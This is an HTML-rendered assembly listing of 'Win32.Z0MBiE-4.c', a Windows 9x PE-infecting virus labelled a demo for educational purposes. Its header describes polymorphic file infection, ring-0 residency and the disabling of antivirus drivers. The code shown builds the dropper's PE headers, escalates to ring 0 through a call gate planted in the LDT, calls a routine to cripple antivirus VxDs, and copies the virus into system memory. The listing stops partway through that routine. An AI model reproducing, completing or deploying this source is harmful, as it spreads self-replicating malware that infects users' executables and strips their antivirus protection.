<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Z0MBIE4C.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc7 {
	font-weight: bold;
	color: #0080C0;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">; Win32.Z0MBiE-4.c</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; demo-virus, for educational purposes; based on 4.b version.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; - PE infector (poly, last section appending)</span><span class="sc0">
</span><span class="sc1">; - ring0-resident via LDT+SEH, standard on-IFS-call file infecting</span><span class="sc0">
</span><span class="sc1">; - i-am-here function using io callback</span><span class="sc0">
</span><span class="sc1">; - kill AV VxDs when entered ring-0 (avp/web)</span><span class="sc0">
</span><span class="sc1">; - ring3 PE-dropper to improve spreading,</span><span class="sc0">
</span><span class="sc1">;   dropper is the own code (virii just contains PE headers at startup)</span><span class="sc0">
</span><span class="sc1">; dropper functions:</span><span class="sc0">
</span><span class="sc1">; - scan drives for files, and simply access 'em (to infect in ring-0)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; engines used: KME32 1.01, KILLAVXD 1.02</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                                                      http://z0mbie.cjb.net</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0">                 </span><span class="sc5">z0mbie4c.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">                 </span><span class="sc5">kme32.int</span><span class="sc0">

                        </span><span class="sc5">p386</span><span class="sc0">
                        </span><span class="sc5">model</span><span class="sc0">   </span><span class="sc10">flat</span><span class="sc0">

                        </span><span class="sc5">locals</span><span class="sc0">  </span><span class="sc5">__</span><span class="sc0">

                        </span><span class="sc9">.data</span><span class="sc0">

</span><span class="sc5">real_start</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">virsize</span><span class="sc4">/</span><span class="sc2">4</span><span class="sc0">  </span><span class="sc1">; same as poly decriptor</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">pe_entry</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">

                        </span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc1">; imports need to test dropper</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ExitProcess</span><span class="sc0">

                        </span><span class="sc9">.code</span><span class="sc0">
</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">; following headers are used to build PE-dropper. 512 bytes at all</span><span class="sc0">

                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'MZ'</span><span class="sc0">            </span><span class="sc1">; mz_id</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">512</span><span class="sc0">             </span><span class="sc1">; mz_last512</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">1</span><span class="sc0">               </span><span class="sc1">; mz_num512</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; mz_relnum</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; mz_hdrsize    (!)</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; mz_minmem</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0FFFFh</span><span class="sc0">          </span><span class="sc1">; mz_maxmem</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0FFF0h</span><span class="sc0">          </span><span class="sc1">; mz_ss</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; mz_sp</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; mz_csum</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">11Ch</span><span class="sc0">            </span><span class="sc1">; mz_ip</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0FFF0h</span><span class="sc0">          </span><span class="sc1">; mz_cs</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">40h</span><span class="sc0">             </span><span class="sc1">; mz_relptr</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; mz_ovrnum</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0B4h</span><span class="sc4">,</span><span class="sc2">4Ch</span><span class="sc4">,</span><span class="sc2">0CDh</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000040h</span><span class="sc0">       </span><span class="sc1">; mz_neptr</span><span class="sc0">

                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'PE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; pe_id</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">14Ch</span><span class="sc0">            </span><span class="sc1">; pe_cputype</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">1</span><span class="sc0">               </span><span class="sc1">; pe_numofobjects</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; pe_datetime</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; pe_cofftableptr</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; pe_cofftablesize</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0E0h</span><span class="sc0">            </span><span class="sc1">; pe_ntheadersize</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">030Fh</span><span class="sc0">           </span><span class="sc1">; pe_exeflags</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">010Bh</span><span class="sc0">           </span><span class="sc1">; pe_ntheader_id</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; pe_linkmajor</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; pe_linkminor</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">VIRTSIZE</span><span class="sc0">        </span><span class="sc1">; pe_sizeofcode</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; pe_sizeofinitdata</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; pe_sizeofuninitdata</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">dropper_entry</span><span class="sc4">-</span><span class="sc5">IMAGEBASE</span><span class="sc0"> </span><span class="sc1">; pe_entrypointrva</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">1000h</span><span class="sc0">           </span><span class="sc1">; pe_baseofcoderva</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; pe_baseofdatarva</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">IMAGEBASE</span><span class="sc0">       </span><span class="sc1">; pe_imagebase</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">4096</span><span class="sc0">            </span><span class="sc1">; pe_objectalign</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">512</span><span class="sc0">             </span><span class="sc1">; pe_filealign</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">5</span><span class="sc0">               </span><span class="sc1">; pe_osmajor</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; pe_osminor</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; pe_usermajor</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; pe_userminor</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">4</span><span class="sc0">               </span><span class="sc1">; pe_subsysmajor</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; pe_subsysminor</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; reserved</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">4096</span><span class="sc4">+</span><span class="sc5">VIRTSIZE</span><span class="sc0">   </span><span class="sc1">; pe_imagesize</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">512</span><span class="sc0">             </span><span class="sc1">; pe_headersize</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; pe_checksum</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">2</span><span class="sc0">               </span><span class="sc1">; pe_subsystem (gui)</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; pe_dllflags</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">65536</span><span class="sc0">           </span><span class="sc1">; pe_stackreservesize</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">4096</span><span class="sc0">            </span><span class="sc1">; pe_stackcommitsize</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">65536</span><span class="sc0">           </span><span class="sc1">; pe_heapreservesize</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">4096</span><span class="sc0">            </span><span class="sc1">; pe_heapcommitsize</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; pe_loaderflags</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">16</span><span class="sc0">              </span><span class="sc1">; pe_numofrvaandsizes</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">             </span><span class="sc1">; export</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">import_start</span><span class="sc4">-</span><span class="sc5">IMAGEBASE</span><span class="sc0"> </span><span class="sc1">; import</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">import_size</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">16</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'.VCL    '</span><span class="sc0">      </span><span class="sc1">; oe_section_name</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">VIRTSIZE</span><span class="sc0">        </span><span class="sc1">; oe_virt_size</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">1000h</span><span class="sc0">           </span><span class="sc1">; oe_virt_rva</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">dropper_size</span><span class="sc0">    </span><span class="sc1">; oe_phys_size</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">512</span><span class="sc0">             </span><span class="sc1">; oe_phys_offs</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">12</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0C0000020h</span><span class="sc0">      </span><span class="sc1">; oe_flags</span><span class="sc0">

                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc2">512</span><span class="sc4">-(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">))</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">pe_entry</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pe_main</span><span class="sc0">

</span><span class="sc1">; return to host</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">68h</span><span class="sc0">             </span><span class="sc1">; push &lt;xxxxxxxx&gt;</span><span class="sc0">
</span><span class="sc5">old_eip</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">rt</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">     </span><span class="sc5">virsize</span><span class="sc0">

</span><span class="sc5">get_base_ebp</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">
</span><span class="sc5">rt</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">pe_main</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc6">pusha</span><span class="sc0">

</span><span class="sc1">; install SEH</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__pop1</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__exit</span><span class="sc0">

</span><span class="sc5">__pop1</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">

</span><span class="sc1">; run ring3 dropper</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ring3main</span><span class="sc0">       </span><span class="sc1">; see ring3.inc</span><span class="sc0">

</span><span class="sc1">; check if alredy resident</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IO_DX</span><span class="sc0">
                        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IO_AL</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__exit</span><span class="sc0">

</span><span class="sc1">; get address of ring0 callgate handler</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__pop2</span><span class="sc0">

</span><span class="sc1">; ring0 callgate handler</span><span class="sc0">
                        </span><span class="sc6">pusha</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ss</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ss</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">install_ring0_stuff</span><span class="sc0">

                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                        </span><span class="sc6">popa</span><span class="sc0">

                        </span><span class="sc6">retf</span><span class="sc0">                    </span><span class="sc1">; retf !</span><span class="sc0">

</span><span class="sc5">__pop2</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">; ESI &lt;-- ring0 proc</span><span class="sc0">

                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">; EBX &lt;-- GDT base</span><span class="sc0">
                        </span><span class="sc6">sgdt</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">

                        </span><span class="sc6">sldt</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">; EAX &lt;- LDT selector (#*8)</span><span class="sc0">
                        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">111b</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__exit</span><span class="sc0">          </span><span class="sc1">; no LDT?</span><span class="sc0">

                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; EBX &lt;-- LDT descriptor offs</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; EDI &lt;-- LDT.base</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">shrd</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">

                        </span><span class="sc7">fild</span><span class="sc0">    </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; save descriptor (#0)</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">        </span><span class="sc1">; build CallGate</span><span class="sc0">
                        </span><span class="sc6">cld</span><span class="sc0">
                        </span><span class="sc6">stosw</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1110110000000000b</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0">
                        </span><span class="sc6">stosd</span><span class="sc0">
                        </span><span class="sc6">shld</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
                        </span><span class="sc6">stosw</span><span class="sc0">

                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">9Ah</span><span class="sc0">             </span><span class="sc1">; call 28:&lt;esi&gt;</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; unused, any number</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">100b</span><span class="sc4">+</span><span class="sc2">11b</span><span class="sc0">        </span><span class="sc1">; #0, LDT+R3</span><span class="sc0">

                        </span><span class="sc7">fistp</span><span class="sc0">   </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc1">; restore descriptor</span><span class="sc0">

</span><span class="sc1">; uninstall SEH</span><span class="sc0">

</span><span class="sc5">__exit</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">install_ring0_stuff</span><span class="sc4">:</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Win9X_Patch_AV_VxDs</span><span class="sc0">     </span><span class="sc1">; fuckup AV</span><span class="sc0">

</span><span class="sc1">; allocate memory</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PAGEFIXED</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PAGEZEROINIT</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; PhysAddr</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; maxPhys</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; minPhys</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; Align</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; handle of VM = 0 if PG_SYS</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PG_SYS</span><span class="sc0">  </span><span class="sc1">; allocate memory in system area</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">virpages</span><span class="sc1">; nPages</span><span class="sc0">
</span><span class="sc5">restvxdc</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc5">VMMcall</span><span class="sc0"> </span><span class="sc5">PageAllocate</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">

                        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__exit</span><span class="sc0">

</span><span class="sc1">; copy virus to new location</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_base_ebp</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; EBP=new location!</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">virsize</span><span class="sc0">
                        </span><span class="sc6">cld</span><span class="sc0">
                        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

</span><span class="sc1">; fill uninitialized data with 0s</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">udatasize</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">stosb</span><span class="sc0">

</span><span class="sc1">; make virus's copy -- all files will be infected with this copy.</span><span class="sc0">
</span><span class="sc1">; we need it because VxDcalls (CD 20 xxx) will be converted to direct CALLs</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">vircopy</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">virsize</span><span class="sc0">
                        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

